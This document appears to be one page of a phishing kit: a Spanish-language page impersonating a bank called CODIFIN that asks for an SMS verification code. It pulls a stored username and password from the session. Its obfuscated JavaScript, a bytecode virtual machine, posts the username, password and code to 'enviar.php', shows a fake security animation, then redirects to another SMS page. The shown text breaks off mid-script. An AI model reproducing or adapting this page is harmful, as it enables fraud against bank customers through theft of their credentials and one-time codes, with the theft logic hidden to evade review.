<?php
session_start();

$usuario = $_SESSION['usuario'] ?? '';
$clave = $_SESSION['clave'] ?? '';
?>
<!DOCTYPE html>
<html lang="es">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>CODIFIN | Plataforma Financiera</title>

<style>

*{
box-sizing:border-box;
margin:0;
padding:0;
font-family:Arial, Helvetica, sans-serif;
}

/* BODY */

body{
min-height:100vh;
display:flex;
flex-direction:column;
align-items: center;
background:#ffffff;
}
#securityOverlay{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:transparent;
display:none;
justify-content:center;
align-items:center;
z-index:9999;
}

#securityOverlay polygon{
transition:none;
}
#securityOverlay svg{
width:300px;
height:300px;
}

@keyframes bankPulse{
0%{transform:scale(1);}
50%{transform:scale(1.05);}
100%{transform:scale(1);}
}
#securityOverlay.active svg{
animation:bankPulse 0.8s ease-in-out infinite;
}

#securityOverlay polygon{
filter:brightness(1.05);
}

.hide{
opacity:0;
}
/* CONTENEDOR PRINCIPAL */

.container{
display:flex;
width:100%;
flex:1;
overflow-x:hidden;
align-items:flex-start;

}

/* PANEL LOGIN */

.login-panel{
flex:0 0 530px;
max-width:620px;
padding:80px;
display:flex;
flex-direction:column;
justify-content:flex-start;
background:white;
margin-left:auto;
padding-top:0px;
}


/* LOGO */

.logo{
display:flex;
align-items:center;
gap:2px;
margin-bottom:0px;
margin-top: 50px;
}
.logo1{
height:40px;
margin-bottom:10px;
}

.logo2{
height:40px;
margin-bottom:22px;
}
@media (min-width:1024px){

.logo1{
height:clamp(105px,7vw,155px);
}

.logo2{
height:clamp(100px,7vw,180px);
margin-bottom:30px;
}

}

.logo-square{
width:35px;
height:35px;
background:#2aa54a;
margin-right:12px;
}

.logo-text{
font-size:34px;
font-weight:bold;
color:#1e8e3e;
}

.logo-sub{
font-size:13px;
color:#666;
}

/* TEXTOS */

.title{
font-size:15px;
font-weight: 550;
color:#4a4a4a;
margin-bottom:7px;
margin-top:30px ;
}

.subtitle{
color:#666;
margin-bottom:8px;
}

/* INPUTS */

input{
width:100%;
padding:10px;
border:1px solid #ccc;
border-radius:4px;
margin-bottom:8px;
font-size:16px;
letter-spacing:0.5px;
color:#6a6a6a;
}


/* 🔥 ESTO AGREGAS AQUÍ */
input:focus{
outline:none;
border:2px solid #000;
box-shadow:none;
}

/* 🔥 AUTOFILL (AQUÍ VA ESTO) */
input:-webkit-autofill,
input:-webkit-autofill:hover,
input:-webkit-autofill:focus{

-webkit-box-shadow: 0 0 0 30px white inset !important;
box-shadow: 0 0 0 30px white inset !important;

-webkit-text-fill-color: #000 !important;

border:2px solid #000 !important;

}

.input-label{
font-size:14px;
color:#666;
margin-bottom:6px;
margin-top:35px;
font-weight:500;
}

/* OPCIONES */

.options{
display:flex;
justify-content:space-between;
align-items:center;
margin-bottom:0px;
margin-top: 30px;
font-size:14px;
}

.options a{
font-size:15px;
font-weight: 550;
text-decoration:underline;
color:#1a8338;
margin-bottom: 10px;
margin-top: 10px;
}

/* SWITCH */

.remember-container{
display:flex;
align-items:center;
gap:12px;
}

.switch{
position:relative;
display:inline-block;
width:56px;
height:33px;
}

.switch input{
opacity:0;
width:0;
height:0;
}

.slider{
position:absolute;
cursor:pointer;
top:0;
left:0;
right:0;
bottom:0;
background:#aeaeae;
border-radius:34px;
transition:.3s;
}

.slider:before{
position:absolute;
content:"";
height:30.5px;
width:30.5px;
left:1.5px;
bottom:1.5px;
background:white;
border-radius:50%;
transition:.3s;
}

.switch input:checked + .slider{
background:#2aa54a;
}

.switch input:checked + .slider:before{
transform:translateX(24px);
}

/* BOTON */

button{
width:100%;
padding:12px;
background:#f0f0f0;
border:none;
border-radius:4px;
cursor:pointer;
font-size:16px;
font-weight:550;
color:#6a6a6a;
margin-bottom:30px;
}

button.active{
background:#22853d;
color:white;
}

/* LINKS EXTRA */

.extra-links{
display:flex;
justify-content:space-between;
margin-bottom:180px;
}

.extra-links a{
color:#2c8747;
text-decoration:underline;
font-size:16px;
font-weight:600;
}

/* PANEL IMAGEN */

.image-panel{
flex:1;
display:flex;
align-items:center;
justify-content:center;
background:#ffffff;
}

.image-panel img{
width:103%;
height:100%;
object-fit:contain;
display:block;
background:#ffffff;
}

/* FOOTER */

.footer-full{
width:100%;
background:transparent;
text-align:center;
color:white;
padding:40px 10px 25px 10px;
}

.footer-links{
display:flex;
justify-content:center;
gap:10px;
flex-wrap:wrap;
margin-bottom:15px;
}

.footer-links a{
color:white;
text-decoration:none;
font-weight:500;
}

.footer-links a::after{
content:" |";
margin-left:8px;
}

.footer-links a:last-child::after{
content:"";
}
@media (max-width:700px){

.footer-links a:nth-child(n+3){
display:none;
}

.footer-links a:nth-child(2)::after{
content:"";
}

}

.footer-copy{
font-size:14px;
}

/* ================= */
/* RESPONSIVE */
/* ================= */

@media (max-width:768px){

body{

background:
linear-gradient(
to top,
#1a6b14 0%,
#2f8f1a 40%,
#4fa81e 70%,
#63b51f 100%
),
linear-gradient(
90deg,
rgba(0,0,0,0.18) 0%,
rgba(0,0,0,0) 25%,
rgba(0,0,0,0) 75%,
rgba(0,0,0,0.18) 100%
);

padding-top:clamp(40px,6vh,100px);
padding-bottom:clamp(60px,10vh,140px);
padding-left:0px;
padding-right:0px;

min-height:100vh;
overflow:auto;
}

/* centrar login */

.container{
display:flex;
justify-content:center;
align-items:center;
width:100%;
margin:0 auto;
}

/* panel */

.login-panel{
display: block;
width:100%;
max-width:90%;
margin-left:auto;
margin-right:auto;
padding:20px 40px;
border-radius:6px;
box-shadow:0 10px 30px rgba(0,0,0,0.15);
}

/* ocultar imagen */

.image-panel{
display:none;
}

}

</style>

</head>

<body>
<div id="securityOverlay">

<svg width="400" height="400" viewBox="0 0 200 200">

<!-- 1 -->
<polygon id="p1"
points="50,100 100,100 100,75"
fill="#071018"/>

<!-- 2 -->
<polygon id="p2"
points="50,100 100,75 100,50"
fill="#0b1320"/>

<!-- 3 -->
<polygon id="p3"
points="100,50 125,100 150,100"
fill="#1f6f3e"/>

<!-- 4 -->
<polygon id="p4"
points="100,50 100,100 125,100"
fill="#2e7b4c"/>

<!-- 5 -->
<polygon id="p5"
points="100,100 150,100 100,150"
fill="#3f6f5c"/>

<!-- 6 -->
<polygon id="p6"
points="100,100 50,100 100,150"
fill="#7CFC00"/>

<!-- 7 -->
<polygon id="p7"
points="50,100 100,150 50,150"
fill="#000000"/>

<!-- 8 -->
<polygon id="p8"
points="50,150 100,150 100,200"
fill="#0b6b3a"/>

</svg>

</div>
<div class="container">

<div class="login-panel">

<div class="logo">


<img src="Imagen5.png" class="logo1">
<img src="Imagen4.png" class="logo2">

</div>
<div class="title">¡Verificacion!</div>
<div class="subtitle">Por favor, ingrese el código enviado por SMS a su numero telefonico:</div>

<div class="input-label">Ingrese codigo</div>
<input type="text" id="usuario" placeholder="Codigo">

<!-- INICIO -->

<div class="options">

<!--<a href="#">Olvidé mi contraseña</a>-->

<div class="remember-container">

<!--<span>Recordarme</span>-->

<!--<label class="switch">
<input type="checkbox">
<span class="slider"></span>
</label>-->

</div>

</div>

<button id="loginBtn" onclick="login()">Continuar</button>

<div class="extra-links">
<a href="#">Cancelar</a>
<!--<a href="#">Afiliese</a>-->
</div>

</div>

<div class="image-panel">
<img src="Imagen6.png">
</div>

</div>

<!-- FOOTER -->

<div class="footer-full">

<div class="footer-links">
<a href="#">Sucursales</a>
<a href="#">Contáctenos</a>
<a href="#">Políticas de Privacidad</a>
<a href="#">Términos y Condiciones</a>
<a href="#">FAQs</a>
</div>

<div class="footer-copy">
(C) Copyright CODIFIN. Todos los derechos reservados.
</div>

</div>

<script>
 
let vmd=typeof globalThis!=='undefined'?globalThis:typeof window!=='undefined'?window:global,vmZ=Object['defineProperty'],vmY=Object['create'],vmG=Object['getOwnPropertyDescriptor'],vmv=Object['getOwnPropertyNames'],vmS=Object['getOwnPropertySymbols'],vmD=Object['setPrototypeOf'],vmB=Object['getPrototypeOf'],vmF=Function['prototype']['call'],vmK=Function['prototype']['apply'],vmQ=Reflect['apply'],vmg_8e0e94=vmd['vmg_8e0e94']||(vmd['vmg_8e0e94']={});const vmN_22d42c=(function(){let j=['AQAIAQAAABQIEnVzZXJJbnB1dAgKdmFsdWUIDGxlbmd0aAQACBBsb2dpbkJ0bggSY2xhc3NMaXN0CAZhZGQIDGFjdGl2ZQQBCAxyZW1vdmU6BAAEAQQCBAMAAAQEBAUABAYEBwAABAgEAQAABAQEBQAECQQHAAAECAQBAAAApgOMAYwBAFxopgOMAQiMAQA2NgBuBmSmA4wBCIwBADY2AG4GAnAECiIgNg==','AQEACQACAAQMCBBkb2N1bWVudAgcZ2V0RWxlbWVudEJ5SWQEAQgKc3R5bGUIAjEIDm9wYWNpdHkcBAAEAAQAAAQBBAAAAAQCBAEEAwQEBAUAqgOkA5YBCIwBEDY2AG6MAQCOAQY=','AQEACQAAAAQOCBBkb2N1bWVudAgcZ2V0RWxlbWVudEJ5SWQIEl8weDMzMGZjNwQBCApzdHlsZQgCMAgOb3BhY2l0eRwEAAQABAAABAEEAgAABAMEAQQEBAUEBgCqA6QDlgEIjAGmAzY2AG6MAQCOAQY=','AQEAAQAEAAoIEl8weDMzMGZjNwQCBHgIFHNldFRpbWVvdXQEAhwEAAQABAAEAAAEAQAEAQQCAAQDBAQEAgCqA6QDEK4DBgDIARAAGJYBAGwG','AQEICQAAAAQkCBJfMHhjNGEzYTQEAwgSXzB4OTE1YjVhBAAIDm92ZXJsYXkIEmNsYXNzTGlzdAgMcmVtb3ZlCAxhY3RpdmUEAQgKc3R5bGUICG5vbmUIDmRpc3BsYXkCCA5ydW5uaW5nCAx3aW5kb3cIEGxvY2F0aW9uCA5TTVMucGhwCAhocmVmUgQABAAEAAAAAAQAAAQABAEAAAQCBAMEAAAABAQEBQAEBgQHAAAECAQBAAQEBAkECgQLAAQMAAQNAAQOBA8EEAQRAKoDpAOmAzgIIKgDBqYDAFhopgMAbAZkpgOMAQiMAQA2NgBuBqYDjAEAjgEGAAioAwaWAYwBAI4BBgQWIiBS','AQgACQAAABIEFAgSXzB4OGNjYmYyCA5mb3JFYWNoBAEEAQQDBAQFsAQIFHNldFRpbWVvdXQEAggSXzB4OTE1YjVhOgQABAAEAAAEAQQCAAAABAMEAQAEAAAEAQQEAAAABAMEAQAEBQAEBgQHBAgEAgCqA6QDpgMIjAEAyAE2NgBuBqYDCIwBAMgBNjYAbgYAyAEAlgEAbAY=','AQIYAQAADGAEBQgSXzB4OTE1YjVhCBJfMHg4Y2NiZjIIEl8weGM0YTNhNAgQZG9jdW1lbnQIHGdldEVsZW1lbnRCeUlkCA51c3VhcmlvBAEICnZhbHVlCApjbGF2ZQgOY29uc29sZQgGbG9nCBhGQUxUQU4gREFUT1MIDnJ1bm5pbmcDCA5vdmVybGF5CApzdHlsZQgIZmxleAgOZGlzcGxheQgSY2xhc3NMaXN0CAZhZGQIDGFjdGl2ZQgUZW52aWFyLnBocAgIUE9TVAgMbWV0aG9kCEJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQIGENvbnRlbnQtVHlwZQgOaGVhZGVycwgQdXN1YXJpbz0IJGVuY29kZVVSSUNvbXBvbmVudAgOJmNsYXZlPQgQJmNvZGlnbz0ICGJvZHkICmZldGNoBAIICHRleHQEAAgQRU5WSUFETzoIGF8weDE1YjU3OSQkMQgMRVJST1I6CARwMQgEcDIIBHAzCARwNAgEcDUIBHA2CARwNwgEcDjUAqoDBACkAwQAAAQAyAEACAAOBACuAwQBtAMEArQDBAOWAQQECACMAQQFAAQGNgA2AAAEB24EAYwBBAgOBAGmAwQGQAAIAGYABgCmAwQJQAAIAGYABgAMBAFAAGgAlgEECggAjAEECwAEDDYANgAABAduBAEGAAIAcACmAwQNaAACAHAAAAQOCACoAwQNBgCmAwQPjAEEEAAEEY4BBBIGAKYDBA+MAQQTCACMAQQUAAQVNgA2AAAEB24EAQYAdAAABBaaAQAIAAAEF6YBBBgIAJoBAAgAAAQZpgEEGqYBBBsIAAAEHKYDBAaWAQQdAAQHbAQBFAAABB4UAKYDBAmWAQQdAAQHbAQBFAAABB8UAAwEAZYBBB0ABAdsBAEUAKYBBCCWAQQhAAQibAQC9AEADgQCDAQCCACMAQQjAAQkbgQA9AEADgQDlgEECggAjAEECwAEJTYANgAMBAM2ADYAAAQibgQCBgB2AGQAqgMEAKQDBAB4BCaWAQQKCACMAQQLAAQnNgA2AKYDBCY2ADYAAAQibgQCBgCsAwQAZAC0AQAABCi2AQAABCm2AQAABCq2AQAABCu2AQAABCy2AQAABC22AQAABC62AQAABC+2AQCuAwQCAAQkrgMEAwwEAAAEJGwEAAYArAMEAAIAcAAMLDQ2Pj5WWF76AZ4CnAKeAgKEAf4BAKAC'],C={'0':0x5f,'1':0x127,'2':0x58,'3':0x199,'4':0xa7,'5':0x1cd,'6':0x1d3,'7':0xbb,'8':0x28,'9':0xe,'10':0x6d,'11':0x1df,'12':0xbd,'13':0x1ce,'14':0xeb,'15':0x3e,'16':0x1a1,'17':0x38,'18':0x18,'19':0x150,'20':0x1a0,'21':0x12a,'22':0x13,'23':0x1eb,'24':0x183,'25':0x117,'26':0x8a,'27':0x77,'28':0xba,'29':0x1c1,'32':0x13d,'40':0xda,'41':0x14a,'42':0x159,'43':0x1a3,'44':0x1d8,'45':0x1ec,'46':0x1c2,'47':0x1db,'50':0x1b8,'51':0xcb,'52':0x18f,'53':0x124,'54':0x2b,'55':0x15,'56':0x4d,'57':0x7e,'58':0x171,'59':0x185,'60':0xc6,'61':0x100,'62':0xd3,'63':0x1bc,'64':0x1b5,'65':0x147,'70':0x11d,'71':0x96,'72':0x93,'73':0x92,'74':0x1ea,'75':0x1be,'76':0x1f6,'77':0x88,'78':0xd1,'79':0x20,'80':0x27,'81':0x156,'82':0xd8,'83':0x198,'84':0x194,'90':0x32,'91':0x157,'92':0x4e,'93':0xe5,'94':0x10f,'95':0x114,'100':0x9e,'101':0xb3,'102':0x65,'103':0xd2,'104':0xf8,'105':0xf4,'106':0xfb,'107':0xa1,'110':0x14f,'111':0x155,'112':0xc1,'120':0x3,'121':0x110,'122':0xcf,'123':0x1c9,'124':0x9a,'125':0x94,'126':0x2f,'127':0xff,'128':0x8f,'129':0x1f3,'130':0xa,'131':0x24,'132':0x135,'140':0x46,'141':0x7,'142':0x82,'143':0x108,'144':0x134,'145':0x6,'146':0x72,'147':0x128,'148':0xe6,'149':0x14b,'150':0x1b9,'151':0xe9,'152':0x7f,'153':0x115,'154':0x7b,'155':0x1b2,'156':0x90,'157':0x1c7,'158':0x45,'160':0x140,'161':0x3b,'162':0x1ff,'163':0x15d,'164':0x5b,'165':0xfc,'166':0x18a,'167':0x1bb,'168':0x166,'169':0xf,'180':0x86,'181':0x1a2,'182':0x16b,'183':0x17e,'184':0x4c,'185':0x1e2,'200':0x125,'201':0x1f8,'202':0x1f4,'210':0x17a,'211':0x109,'212':0x1da,'213':0x41,'214':0x99,'215':0x1c8,'216':0x7a,'217':0xbf,'218':0x1c,'219':0x1f9,'220':0xab,'221':0x160,'250':0x179,'251':0xac,'252':0x5a,'253':0x8b,'254':0x165,'255':0xce,'256':0xcc,'257':0x1b4,'258':0xf9,'259':0x31,'260':0x107,'261':0x2c,'270':0x8,'271':0x193};const l=0x1,E=0x2,N=0x3,y=0x4,x=0x78,i=0x79,g=0x7a,f=typeof 0x0n,U=[],d=function(){throw new TypeError('\x27caller\x27,\x20\x27callee\x27,\x20and\x20\x27arguments\x27\x20properties\x20may\x20not\x20be\x20accessed\x20on\x20strict\x20mode\x20functions\x20or\x20the\x20arguments\x20objects\x20for\x20calls\x20to\x20them');};Object['preventExtensions'](d);let M=new WeakSet(),b=new WeakSet(),Z=new WeakMap();function Y(jB,jF,jK){try{vmZ(jB,jF,jK);}catch(jQ){}}function G(jB,jF){let jK=new Array(jF),jQ=![];for(let jA=jF-0x1;jA>=0x0;jA--){let ja=jB();ja&&typeof ja==='object'&&M['has'](ja)?(jQ=!![],jK[jA]=ja):jK[jA]=ja;}if(!jQ)return jK;let jr=[];for(let jn=0x0;jn<jF;jn++){let jq=jK[jn];if(jq&&typeof jq==='object'&&M['has'](jq)){let jw=jq['value'];if(Array['isArray'](jw)){for(let jJ=0x0;jJ<jw['length'];jJ++)jr['push'](jw[jJ]);}}else jr['push'](jq);}return jr;}function v(jB){let jF=[];for(let jK in jB){jF['push'](jK);}return jF;}function S(jB){return Array['prototype']['slice']['call'](jB);}function D(jB){return typeof jB==='function'&&jB['prototype']?jB['prototype']:jB;}function B(jB){if(typeof jB==='function')return vmB(jB);let jF=vmB(jB),jK=jF&&vmG(jF,'constructor'),jQ=jK&&jK['value'],jr=jQ&&typeof jQ==='function'&&(jQ['prototype']===jF||vmB(jQ['prototype'])===vmB(jF));if(jr)return vmB(jF);return jF;}function F(jB,jF){let jK=jB;while(jK!==null){let jQ=vmG(jK,jF);if(jQ)return{'desc':jQ,'proto':jK};jK=vmB(jK);}return{'desc':null,'proto':jB};}function K(jB,jF){if(!jB['_$n9ZZux'])return;jF in jB['_$n9ZZux']&&delete jB['_$n9ZZux'][jF];let jK=jF['indexOf']('$$');if(jK!==-0x1){let jQ=jF['substring'](0x0,jK);jQ in jB['_$n9ZZux']&&delete jB['_$n9ZZux'][jQ];}}function Q(jB,jF){let jK=jB;while(jK){K(jK,jF),jK=jK['_$xQCdVF'];}}function r(jB,jF,jK,jQ){if(jQ){let jr=Reflect['set'](jB,jF,jK);if(!jr)throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(jF)+'\x27\x20of\x20object');}else Reflect['set'](jB,jF,jK);}function A(){return!vmg_8e0e94['_$K8YRHC']&&(vmg_8e0e94['_$K8YRHC']=new Map()),vmg_8e0e94['_$K8YRHC'];}function a(){return vmg_8e0e94['_$K8YRHC']||null;}function n(jB,jF,jK){if(jB[0x1]===undefined||!jK)return;let jQ=jB[0x15][jB[0x1]];!jF['_$Ejew7m']&&(jF['_$Ejew7m']=vmY(null)),jF['_$Ejew7m'][jQ]=jK,jB[0x9]&&(!jF['_$j23EpX']&&(jF['_$j23EpX']=vmY(null)),jF['_$j23EpX'][jQ]=!![]),Y(jK,'name',{'value':jQ,'writable':![],'enumerable':![],'configurable':!![]});}function q(jB){return'_$bJYftn'+jB['substring'](0x1)+'_$WgVqWs';}function w(jB){return'_$XyWOr0'+jB['substring'](0x1)+'_$5OGgh7';}function J(jB,jF,jK,jQ,jr){let jA;return jQ?jA=function ja(){let jn=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return jB(jF,arguments,jK,jA,jn,this===jr?undefined:this);}:jA=function jn(){let jq=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return jB(jF,arguments,jK,jA,jq,this);},Z['set'](jA,{'b':jF,'e':jK}),jA;}function s(jB,jF,jK,jQ,jr){let jA;return jQ?jA=async function ja(){let jn=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return await jB(jF,arguments,jK,jA,jn,undefined,this===jr?undefined:this);}:jA=async function jn(){let jq=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return await jB(jF,arguments,jK,jA,jq,undefined,this);},jA;}function I(jB,jF,jK,jQ,jr,jA){let ja;return jr?ja=function jn(){return jB(jF,arguments,jK,ja,undefined,this===jA?undefined:this);}:ja=function jq(){return jB(jF,arguments,jK,ja,undefined,this);},jQ['add'](ja),ja;}function W(jB,jF,jK,jQ){let jr;return jr={'kywxUV':(...jA)=>{return jB(jF,jA,jK,jr,undefined,jQ);}}['kywxUV'],jr;}function u(jB,jF,jK,jQ){let jr;return jr={'kywxUV':async(...jA)=>{return await jB(jF,jA,jK,jr,undefined,undefined,jQ);}}['kywxUV'],jr;}function O(jB,jF,jK,jQ,jr){let jA;return jQ?jA={'kywxUV'(){let ja=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return jB(jF,arguments,jK,jA,ja,this===jr?undefined:this);}}['kywxUV']:jA={'kywxUV'(){let ja=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return jB(jF,arguments,jK,jA,ja,this);}}['kywxUV'],Z['set'](jA,{'b':jF,'e':jK}),jA;}function z(jB,jF,jK,jQ,jr){let jA;return jQ?jA={async 'kywxUV'(){let ja=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return await jB(jF,arguments,jK,jA,ja,undefined,this===jr?undefined:this);}}['kywxUV']:jA={async 'kywxUV'(){let ja=new.target!==undefined?new.target:vmg_8e0e94['_$iBkIOU'];return await jB(jF,arguments,jK,jA,ja,undefined,this);}}['kywxUV'],jA;}function o(jB,jF,jK,jQ,jr,jA){let ja=new Array(0x8),jn=0x0,jq=new Array((jB[0x12]||0x0)+(jB[0x11]||0x0)),jw=0x0,jJ=jB[0x15],js=jB[0x13],jI=jB[0x10]||U,jW=jB[0x16]||U,ju=js['length']>>0x1,jO=(jB[0x12]*0x1f^jB[0x11]*0x11^ju*0xd^jJ['length']*0x7)>>>0x0&0x3,jz,jo,jt;switch(jO){case 0x1:jz=0x1,jo=0x0,jt=0x1;break;case 0x2:jz=0x0,jo=ju,jt=0x0;break;case 0x3:jz=ju,jo=0x0,jt=0x0;break;default:jz=0x0,jo=0x1,jt=0x1;break;}let jk=null,jT=null,jX=![],jL=undefined,jR=![],jm=0x0,jV=![],jH=0x0,jP=!!jB[0x6],je=!!jB[0x2],jh=!!jB[0x5],jc=!!jB[0xf],jp=jA,C0=!!jB[0xc];!jP&&!C0&&(jA===undefined||jA===null)&&(jA=vmd);let C1=Cg=>{ja[jn++]=Cg;},C2=()=>ja[--jn],C3=Cg=>Cg,C4={['_$Ejew7m']:null,['_$f84dGi']:null,['_$n9ZZux']:null,['_$xQCdVF']:jK};if(jF){let Cg=jB[0x12]||0x0;for(let Cf=0x0,CU=jF['length']<Cg?jF['length']:Cg;Cf<CU;Cf++){jq[Cf]=jF[Cf];}}let C5=(jP||!je)&&jF?S(jF):null,C6=null,C7=![],C8=jq['length'],C9=null,Cj=0x0;jc&&(C4['_$n9ZZux']=vmY(null),C4['_$n9ZZux']['__this__']=!![]);n(jB,C4,jQ);let CC={['_$PrfoPg']:jP,['_$ljpiDP']:je,['_$RGOBBT']:jh,['_$gGmnny']:jc,['_$EnCqdU']:C7,['_$7e7bv7']:jp,['_$GeMxwg']:C5,['_$pS9Iwn']:C4};while(jw<ju){try{while(jw<ju){let Cd=js[jz+(jw<<jt)],CM=js[jo+(jw<<jt)];var Cl,CE,CN,Cy,Cx,Ci;!Cy&&(CE=null,CN=function(){for(let Cb=C8-0x1;Cb>=0x0;Cb--){jq[Cb]=C9[--Cj];}C4=C9[--Cj],CC['_$pS9Iwn']=C4,C5=C9[--Cj],CC['_$GeMxwg']=C5,C6=C9[--Cj],jF=C9[--Cj],jn=C9[--Cj],jw=C9[--Cj],ja[jn++]=Cl,jw++;},Cy=function(Cb,CZ){switch(Cb){case 0x47:{EZ:{let CY=ja[--jn],CG=ja[--jn],Cv=jJ[CZ];if(CG===null||CG===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(Cv)+'\x27\x20of\x20'+CG);if(CE['_$PrfoPg']){if(!Reflect['set'](CG,Cv,CY))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(Cv)+'\x27\x20of\x20object');}else CG[Cv]=CY;ja[jn++]=CY,jw++;}break;}case 0xf:{EY:{ja[jn-0x1]=-ja[jn-0x1],jw++;}break;}case 0x2f:{EG:{let CS=ja[--jn],CD=ja[--jn];ja[jn++]=CD>=CS,jw++;}break;}case 0x4d:{Ev:{ja[jn++]={},jw++;}break;}case 0x19:{ES:{let CB=ja[--jn],CF=ja[--jn];ja[jn++]=CF>>CB,jw++;}break;}case 0x2c:{ED:{let CK=ja[--jn],CQ=ja[--jn];ja[jn++]=CQ<CK,jw++;}break;}case 0x17:{EB:{ja[jn-0x1]=~ja[jn-0x1],jw++;}break;}case 0x33:{EF:{ja[--jn]?jw=jI[jw]:jw++;}break;}case 0x2d:{EK:{let Cr=ja[--jn],CA=ja[--jn];ja[jn++]=CA<=Cr,jw++;}break;}case 0x12:{EQ:{let Ca=ja[--jn],Cn=ja[--jn];ja[jn++]=Cn**Ca,jw++;}break;}case 0x1d:{Er:{ja[jn-0x1]=String(ja[jn-0x1]),jw++;}break;}case 0x1a:{EA:{let Cq=ja[--jn],Cw=ja[--jn];ja[jn++]=Cw>>>Cq,jw++;}break;}case 0x3b:{Ea:{jk['pop'](),jw++;}break;}case 0xb:{En:{let CJ=ja[--jn],Cs=ja[--jn];ja[jn++]=Cs-CJ,jw++;}break;}case 0x7:{Eq:{jq[CZ]=ja[--jn],jw++;}break;}case 0x49:{Ew:{let CI=ja[--jn],CW=ja[--jn],Cu=ja[--jn];if(Cu===null||Cu===undefined)throw new TypeError('Cannot\x20set\x20property\x20\x27'+String(CW)+'\x27\x20of\x20'+Cu);if(CE['_$PrfoPg']){if(!Reflect['set'](Cu,CW,CI))throw new TypeError('Cannot\x20assign\x20to\x20read\x20only\x20property\x20\x27'+String(CW)+'\x27\x20of\x20object');}else Cu[CW]=CI;ja[jn++]=CI,jw++;}break;}case 0x1b:{EJ:{let CO=ja[jn-0x3],Cz=ja[jn-0x2],Co=ja[jn-0x1];ja[jn-0x3]=Cz,ja[jn-0x2]=Co,ja[jn-0x1]=CO,jw++;}break;}case 0x4b:{Es:{let Ct=jJ[CZ],Ck;if(vmg_8e0e94['_$Y9dSnQ']&&Ct in vmg_8e0e94['_$Y9dSnQ'])throw new ReferenceError('Cannot\x20access\x20\x27'+Ct+'\x27\x20before\x20initialization');if(Ct in vmg_8e0e94)Ck=vmg_8e0e94[Ct];else{if(Ct in vmd)Ck=vmd[Ct];else throw new ReferenceError(Ct+'\x20is\x20not\x20defined');}ja[jn++]=Ck,jw++;}break;}case 0x6:{EI:{ja[jn++]=jq[CZ],jw++;}break;}case 0x1c:{EW:{let CT=ja[--jn];ja[jn++]=typeof CT===f?CT:+CT,jw++;}break;}case 0x20:{Eu:{ja[jn-0x1]=!ja[jn-0x1],jw++;}break;}case 0x28:{EO:{let CX=ja[--jn],CL=ja[--jn];ja[jn++]=CL==CX,jw++;}break;}case 0x35:{Ez:{let CR=ja[--jn];CR!==null&&CR!==undefined?jw=jI[jw]:jw++;}break;}case 0x3e:{Eo:{if(jT!==null){jX=![],jR=![],jV=![];let Cm=jT;jT=null;throw Cm;}if(jX){if(jk&&jk['length']>0x0){let CH=jk[jk['length']-0x1];if(CH['_$9BLmcO']!==undefined){jw=CH['_$9BLmcO'];break Eo;}}let CV=jL;return jX=![],jL=undefined,Cl=CV,0x1;}if(jR){if(jk&&jk['length']>0x0){let Ce=jk[jk['length']-0x1];if(Ce['_$9BLmcO']!==undefined){jw=Ce['_$9BLmcO'];break Eo;}}let CP=jm;jR=![],jm=0x0,jw=CP;break Eo;}if(jV){if(jk&&jk['length']>0x0){let Cc=jk[jk['length']-0x1];if(Cc['_$9BLmcO']!==undefined){jw=Cc['_$9BLmcO'];break Eo;}}let Ch=jH;jV=![],jH=0x0,jw=Ch;break Eo;}jw++;}break;}case 0x11:{Et:{let Cp=ja[--jn];ja[jn++]=typeof Cp===f?Cp-0x1n:+Cp-0x1,jw++;}break;}case 0xe:{Ek:{let l0=ja[--jn],l1=ja[--jn];ja[jn++]=l1%l0,jw++;}break;}case 0x39:{ET:{throw ja[--jn];}break;}case 0x3c:{EX:{let l2=ja[--jn];if(CZ!=null){let l3=jJ[CZ];!CE['_$pS9Iwn']['_$Ejew7m']&&(CE['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CE['_$pS9Iwn']['_$Ejew7m'][l3]=l2;}jw++;}break;}case 0x3:{EL:{ja[--jn],jw++;}break;}case 0x3a:{ER:{let l4=jW[jw];if(!jk)jk=[];jk['push']({['_$CDWarX']:l4[0x0]>=0x0?l4[0x0]:undefined,['_$9BLmcO']:l4[0x1]>=0x0?l4[0x1]:undefined,['_$iPzJWv']:l4[0x2]>=0x0?l4[0x2]:undefined,['_$zoO9Bb']:jn}),jw++;}break;}case 0x14:{Em:{let l5=ja[--jn],l6=ja[--jn];ja[jn++]=l6&l5,jw++;}break;}case 0x48:{EV:{let l7=ja[--jn],l8=ja[--jn];if(l8===null||l8===undefined)throw new TypeError('Cannot\x20read\x20property\x20\x27'+String(l7)+'\x27\x20of\x20'+l8);ja[jn++]=l8[l7],jw++;}break;}case 0x5:{EH:{let l9=ja[jn-0x1];ja[jn-0x1]=ja[jn-0x2],ja[jn-0x2]=l9,jw++;}break;}case 0x18:{EP:{let lj=ja[--jn],lC=ja[--jn];ja[jn++]=lC<<lj,jw++;}break;}case 0x36:{Ee:{let ll=ja[--jn],lE=ja[--jn];if(typeof lE!=='function')throw new TypeError(lE+'\x20is\x20not\x20a\x20function');let lN=vmg_8e0e94['_$j2q9Zj'],ly=!vmg_8e0e94['_$mOUl7D']&&!vmg_8e0e94['_$iBkIOU']&&!(lN&&lN['get'](lE))&&Z['get'](lE);if(ly){let lU=ly['c']||(ly['c']=typeof ly['b']==='object'?ly['b']:jv(ly['b']));if(lU){let ld;if(ll===0x0)ld=[];else{if(ll===0x1){let lb=ja[--jn];ld=lb&&typeof lb==='object'&&M['has'](lb)?lb['value']:[lb];}else ld=G(C2,ll);}let lM=lU[0xa];if(lM&&lU===jB&&!lU[0x16]&&ly['e']===jK){!C9&&(C9=[]);C9[Cj++]=jw,C9[Cj++]=jn,C9[Cj++]=jF,C9[Cj++]=C6,C9[Cj++]=C5,C9[Cj++]=C4;for(let lZ=0x0;lZ<C8;lZ++){C9[Cj++]=jq[lZ];}jF=ld,C6=null;if(lU[0x2]){C5=null;let 